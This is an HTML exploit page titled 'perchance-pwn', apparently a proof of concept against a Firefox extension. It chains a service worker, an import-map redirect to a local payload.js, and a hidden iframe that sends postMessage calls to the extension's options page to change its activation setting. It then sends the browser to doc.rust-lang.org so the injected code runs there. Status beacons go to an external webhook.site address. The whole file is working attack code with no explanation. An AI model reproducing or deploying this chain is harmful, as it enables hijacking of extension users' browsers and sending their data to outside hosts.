<!doctype html>
<html>
<head>
<meta charset="utf-8">
<script type="importmap">
{ "imports": { "http://localhost:3000/jsxss.js": "./payload.js" } }
</script>
<title>perchance-pwn</title>
</head>
<body>
<script>
const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
const EXFIL    = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };

// confirm cs.js ran: it appends <p>Previous: ...</p>
new MutationObserver((muts) => {
  for (const m of muts) for (const n of m.addedNodes) {
    try {
      if (n.tagName === 'P' && /^Previous:/.test(n.textContent)) beacon('cs-ran:' + n.textContent.slice(0,80));
      if (n.tagName === 'SCRIPT' && n.type === 'module') beacon('module-injected');
    } catch(e){}
  }
}).observe(document.documentElement, { childList: true, subtree: true });

function setActivateOn(urlStr) {
  return new Promise((res) => {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    f.src = OPTIONS;
    f.onload = () => { setTimeout(() => { try{ f.contentWindow.postMessage(urlStr, '*'); }catch(e){ beacon('pm-err'); } res(); }, 300); };
    f.onerror = () => { beacon('iframe-err'); res(); };
    document.body.appendChild(f);
  });
}
const wait = (ms) => new Promise(r => setTimeout(r, ms));

(async () => {
  const stage = new URL(location.href).searchParams.get('stage');
  beacon('load:' + (stage||'init'));

  if (stage !== 'poison') {
    // register SW first, wait until it's active so it controls the next navigation
    try {
      await navigator.serviceWorker.register('sw.js', { scope: './' });
      await navigator.serviceWorker.ready;
      beacon('sw-ready');
    } catch(e){ beacon('sw-err:' + e); }
    await wait(500);
    await setActivateOn(location.origin + '/#https://doc.rust-lang.org/');
    beacon('set-activateOn-self');
    await wait(1500);
    beacon('nav->poison');
    location.href = '?stage=poison#https://doc.rust-lang.org/';
    return;
  }

  beacon('controlled:' + !!navigator.serviceWorker.controller);
  await wait(5000);          // let cs.js run + module import + factory + message persist
  beacon('poison-waited');
  await setActivateOn('https://doc.rust-lang.org/');
  beacon('set-activateOn-docs');
  await wait(1500);
  beacon('nav->docs');
  location.href = 'https://doc.rust-lang.org/stable/std/index.html';
})();
</script>
</body>
</html>
